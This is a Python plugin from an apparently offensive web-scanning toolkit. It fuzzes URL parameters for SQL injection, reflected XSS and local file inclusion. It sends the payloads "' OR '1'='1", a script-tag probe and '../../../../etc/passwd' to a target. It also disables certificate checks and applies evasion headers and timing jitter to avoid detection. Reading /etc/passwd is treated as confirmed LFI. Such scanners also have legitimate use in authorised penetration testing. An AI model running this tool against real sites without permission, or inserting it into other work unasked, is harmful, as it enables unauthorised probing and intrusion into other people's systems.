import asyncio
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.evasion import get_evasion_headers, apply_jitter

PLUGIN_META = {
    "name": "Automated Parameter Injection Fuzzer",
    "flag": "--param-fuzz",
    "description": "Fuzz URL parameters and inputs for SQLi, XSS, and LFI vulnerabilities",
    "category": "offensive"
}

TEST_PARAMS = ["s", "q", "search", "id", "query", "cat"]

PAYLOADS = [
    ("SQL Injection", "' OR '1'='1"),
    ("Cross-Site Scripting", "<script>fuzz_test_xss</script>"),
    ("Local File Inclusion", "../../../../etc/passwd")
]

async def run(target_url, reporter=None):
    print(f"[*] Starting Automated Parameter Injection Fuzzer against: {target_url}")
    findings = []
    
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query)
    
    # If no query parameters in target_url, use default common test parameters
    target_params = list(query_params.keys()) if query_params else TEST_PARAMS
    
    async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
        for param in target_params:
            for vuln_type, payload in PAYLOADS:
                await apply_jitter(0.2, 0.5)
                headers = get_evasion_headers()
                
                test_query_params = query_params.copy()
                test_query_params[param] = [payload]
                
                new_query = urlencode(test_query_params, doseq=True)
                fuzzed_parts = parsed_url._replace(query=new_query)
                fuzzed_url = urlunparse(fuzzed_parts)
                
                if not parsed_url.query and not fuzzed_url.startswith("http"):
                    base = target_url.split("?")[0]
                    fuzzed_url = f"{base}?{param}={payload}"

                try:
                    resp = await client.get(fuzzed_url, headers=headers, timeout=5.0)
                    
                    is_vuln = False
                    severity = "LOW"
                    desc = ""
                    
                    if vuln_type == "Cross-Site Scripting" and "<script>fuzz_test_xss</script>" in resp.text:
                        is_vuln = True
                        severity = "MEDIUM"
                        desc = f"Reflected XSS detected in parameter '{param}' using payload: {payload}"
                    elif vuln_type == "SQL Injection" and (resp.status_code == 500 or "sql syntax" in resp.text.lower() or "mysql" in resp.text.lower()):
                        is_vuln = True
                        severity = "HIGH"
                        desc = f"Potential SQL Injection detected in parameter '{param}' (HTTP {resp.status_code})"
                    elif vuln_type == "Local File Inclusion" and "root:x:" in resp.text:
                        is_vuln = True
                        severity = "CRITICAL"
                        desc = f"Local File Inclusion (LFI) confirmed in parameter '{param}'"

                    if is_vuln:
                        print(f"[!] [{severity}] {desc}")
                        findings.append({"parameter": param, "type": vuln_type, "url": fuzzed_url, "severity": severity})
                        if reporter:
                            reporter.add_finding(
                                module="Parameter Fuzzer",
                                severity=severity,
                                description=desc,
                                details={"parameter": param, "payload": payload, "url": fuzzed_url}
                            )
                    else:
                        print(f"[*] Fuzzing param [{param}] with [{vuln_type}] -> Status: {resp.status_code}")
                        
                except Exception:
                    pass

    print(f"[*] Parameter fuzzer completed. Confirmed findings: {len(findings)}")
    if reporter:
        reporter.add_section("Parameter Fuzzing Analysis", {"findings_count": len(findings), "findings": findings})
